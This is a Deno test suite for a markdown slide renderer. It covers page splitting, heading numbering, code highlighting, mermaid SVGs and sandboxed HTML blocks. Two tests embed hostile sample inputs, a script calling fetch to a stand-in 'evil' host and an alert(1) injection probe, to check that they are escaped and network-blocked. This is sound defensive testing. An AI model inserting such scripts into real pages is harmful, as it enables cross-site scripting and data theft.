import { assert, assertEquals, assertStringIncludes } from "@std/assert";
import { renderSlides } from "./render.ts";

Deno.test("splits pages on top-level '---' and numbers from 1", async () => {
  const md = "# One\n\ntext a\n\n---\n\n## Two\n\ntext b";
  const { pages, title } = await renderSlides(md);
  assertEquals(pages.length, 2);
  assertEquals(title, "One");
  assertStringIncludes(pages[0], "text a");
  assertStringIncludes(pages[1], "text b");
});

Deno.test("does NOT split on '---' inside a code fence", async () => {
  const md = "# Title\n\n```\nfoo\n---\nbar\n```\n";
  const { pages } = await renderSlides(md);
  assertEquals(pages.length, 1);
  assertStringIncludes(pages[0], "---");
});

Deno.test("numbers headings per page with data-page / data-idx (1-based)", async () => {
  const md = "# A\n\n## A2\n\n---\n\n# B\n\n### B2";
  const { pages, headings } = await renderSlides(md);
  // page 1
  assertStringIncludes(pages[0], 'data-page="1"');
  assertStringIncludes(pages[0], 'data-idx="1"');
  assertStringIncludes(pages[0], 'data-idx="2"');
  // page 2 restarts idx at 1
  assertStringIncludes(pages[1], 'data-page="2"');
  assertStringIncludes(pages[1], 'data-idx="1"');
  assertEquals(headings.length, 4);
  assertEquals(headings[0], { page: 1, idx: 1, depth: 1, text: "A" });
  assertEquals(headings[1], { page: 1, idx: 2, depth: 2, text: "A2" });
  assertEquals(headings[2], { page: 2, idx: 1, depth: 1, text: "B" });
  assertEquals(headings[3], { page: 2, idx: 2, depth: 3, text: "B2" });
});

Deno.test("title falls back to 'Untitled' with no h1", async () => {
  const { title } = await renderSlides("## no h1 here\n\ntext");
  assertEquals(title, "Untitled");
});

Deno.test("ignores YAML frontmatter", async () => {
  const md = "---\ntitle: x\n---\n\n# Real\n\nbody";
  const { pages, title } = await renderSlides(md);
  assertEquals(pages.length, 1);
  assertEquals(title, "Real");
  assert(!pages[0].includes("title: x"));
});

Deno.test("highlights code via shiki (adds shiki markup)", async () => {
  const md = "# Code\n\n```js\nconst x = 1;\n```\n";
  const { pages } = await renderSlides(md);
  // shiki emits a <pre class="shiki ..."> with inline color styles
  assertStringIncludes(pages[0], "shiki");
  assertStringIncludes(pages[0], "style=");
});

Deno.test("renders mermaid blocks to inline SVG", async () => {
  const md = "# Diagram\n\n```mermaid\nflowchart TD\n  A --> B\n```\n";
  const { pages } = await renderSlides(md);
  assertStringIncludes(pages[0], "zen-mermaid");
  assertStringIncludes(pages[0], "<svg");
  // must NOT be left as a highlighted code block
  assert(!pages[0].includes("language-mermaid"));
});

Deno.test("mermaid SVG has no remote @import (stays self-contained under CSP)", async () => {
  const md = "# Diagram\n\n```mermaid\nflowchart TD\n  A --> B\n```\n";
  const { pages } = await renderSlides(md);
  assertStringIncludes(pages[0], "<svg");
  // beautiful-mermaid embeds a Google Fonts @import; it must be stripped so the
  // viewer makes no third-party request (and the host CSP stays clean).
  assert(!pages[0].includes("fonts.googleapis.com"));
  assert(!/@import\s+url\(\s*['"]?https?:/i.test(pages[0]));
});

Deno.test("zen-html fence emits a sandboxed iframe (no same-origin, blocks network)", async () => {
  const md =
    "# Deck\n\n---\n\n```zen-html\n<div class=box></div>\n<script>fetch('https://evil/x')<\/script>\n```\n";
  const { pages } = await renderSlides(md);
  const html = pages[1];
  // a sandboxed iframe is emitted
  assertStringIncludes(html, "<iframe");
  assertStringIncludes(html, 'class="zen-html-frame"');
  assertStringIncludes(html, 'sandbox="allow-scripts"');
  // must NOT grant same-origin (that would defeat the isolation)
  assert(!html.includes("allow-same-origin"));
  // the srcdoc carries the network-blocking CSP
  assertStringIncludes(html, "Content-Security-Policy");
  assertStringIncludes(html, "connect-src &#39;none&#39;"); // escaped single quotes
  // the code block is gone (not left for shiki)
  assert(!html.includes("language-zen-html"));
});

Deno.test("zen-html author markup is entity-escaped inside srcdoc", async () => {
  const md = "```zen-html\n<script>alert(1)<\/script>\n```\n";
  const { pages } = await renderSlides(md);
  // author <script> survives only as escaped text inside the srcdoc attribute
  assertStringIncludes(pages[0], "&lt;script&gt;alert(1)&lt;/script&gt;");
  // and NOT as a live script tag in the host page
  assert(!pages[0].includes("<script>alert(1)"));
});

Deno.test("plain ```html stays a highlighted code sample (not sandboxed)", async () => {
  const md = "# H\n\n```html\n<b>hi</b>\n```\n";
  const { pages } = await renderSlides(md);
  assertStringIncludes(pages[0], "shiki");
  assert(!pages[0].includes("zen-html-frame"));
});

Deno.test("empty leading page (md starting with '---') is dropped", async () => {
  const md = "---\n\n# First\n\nbody";
  // Note: leading '---' after nothing is frontmatter-like; ensure no empty page
  const { pages } = await renderSlides(md);
  assert(pages.length >= 1);
  assertStringIncludes(pages[0], "First");
});
